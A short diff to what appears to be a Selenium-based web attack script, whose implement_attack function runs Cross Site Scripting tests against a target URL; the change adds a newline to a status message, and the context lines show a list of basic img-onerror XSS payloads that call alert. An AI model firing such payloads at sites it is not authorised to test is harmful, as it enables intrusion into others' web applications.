@@ -12,7 +12,7 @@ def execute(driver, target_url):
 
 
 def implement_attack(driver, target_url):
-    print(f"[+] Running Cross Site Scripting [XSS] Attacks")
+    print(f"[+] Running Cross Site Scripting [XSS] Attacks \n")
     xss_level_1 = [
         """<img src="" onerror="alert('XSS')">""",
         """<IMG SRC=# onerror="alert('XSS')">""",
